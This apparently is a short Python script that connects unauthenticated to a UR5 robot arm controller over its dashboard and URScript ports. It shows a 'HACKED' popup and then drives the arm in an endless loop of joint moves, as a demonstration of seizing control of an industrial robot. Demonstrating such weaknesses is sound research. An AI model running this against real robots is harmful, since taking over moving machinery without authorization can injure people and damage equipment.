# Open and close a popup in the UR5 GUI via 2 ports
# Helpful resources
import socket
import time

# initialise variables
UR5Controller = "192.168.0.7"    # IP address pf UR5 Controller
DASHBOARD_PORT = 29999  # Port to interface via DashBoard server
GENERAL_PORT = 30002    # Port to interface via URScript API & normal python code

# initialise sockets
dashboardSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
generalSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# AF_INET stands for address family, using Internet Protocol 4
# SOCK_STREAM indicates the type of socket (in this case, it's TCP), as opposed to SOCK_DGRAM (UDP)

# connect to UR5 Controller via 2 ports
dashboardSocket.connect((UR5Controller, DASHBOARD_PORT))
generalSocket.connect((UR5Controller, GENERAL_PORT))
data = dashboardSocket.recv(256)
print(data)

#  Open popup, you're hacked
generalSocket.send("popup(\"HACKED\", title=\"HAHAHAHA\", warning=True, error=False)" + "\n")
time.sleep(1)

#  move to mid position of actual2Parts.script
print("MidPos")
generalSocket.send("movej(p[-0.02636,-0.18756,0.53613,0,0,0.812], a=1.2, v=1,r=0)" + "\n")
time.sleep(3)

while 1:
    print("Move Left")
    generalSocket.send("movej(p[-0.28864,-0.12615,0.45872,0.2918,-0.1843,-0.4679], a=1.2, v=1,r=0)" + "\n")
    time.sleep(2.5)

    print("MidPos")
    generalSocket.send("movej(p[-0.02636,-0.18756,0.53613,0,0,0.812], a=1.2, v=1,r=0)" + "\n")
    time.sleep(2.5)

    print("Move Right")
    generalSocket.send("movej(p[0.17694,-0.00916,0.45504,0.1667,0.225,2.509], a=1.2, v=1,r=0)" + "\n")
    time.sleep(3)

    print("MidPos")
    generalSocket.send("movej(p[-0.02636,-0.18756,0.53613,0,0,0.812], a=1.2, v=1,r=0)" + "\n")
    time.sleep(2.5)


# close socket connection
dashboardSocket.close()
generalSocket.close()

print("End of program")